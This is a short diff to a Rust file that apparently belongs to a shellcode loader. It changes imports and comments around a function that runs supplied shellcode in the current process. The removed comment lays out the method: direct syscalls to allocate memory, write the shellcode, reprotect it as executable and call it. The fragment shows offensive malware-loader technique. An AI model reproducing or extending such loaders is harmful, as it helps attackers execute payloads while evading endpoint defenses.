@@ -1,17 +1,20 @@
+use rust_syscalls::syscall;
+// =======================================================================================================
+//
+// DEFAULT SHELLCODE EXECUTION USING NTWriteVritualMemory
+//
+// =======================================================================================================
+
 #[cfg(feature = "ShellcodeExecuteDefault")]
 use windows::Win32::System::Threading::GetCurrentProcess;
 #[cfg(feature = "ShellcodeExecuteDefault")]
 use windows::Win32::Foundation::HANDLE;
 #[cfg(feature = "ShellcodeExecuteDefault")]
 use std::ffi::c_void;
-#[cfg(feature = "ShellcodeExecuteDefault")]
-use rust_syscalls::syscall;
 
 #[cfg(feature = "ShellcodeExecuteDefault")]
 pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
 {
-    // use Syscalls NtAllocateVirtualMemory for RW memory, NtWriteVirtualMemory to write shellcode and , reprotect to RX with NtProtectVirtualMemory
-    // and direct pointer for execution
 
     let mut process_handle: HANDLE = unsafe { GetCurrentProcess() };
     let mut base_address: *mut c_void = std::ptr::null_mut();
@@ -57,3 +60,5 @@ pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
     }
     return true;
 }
+
+
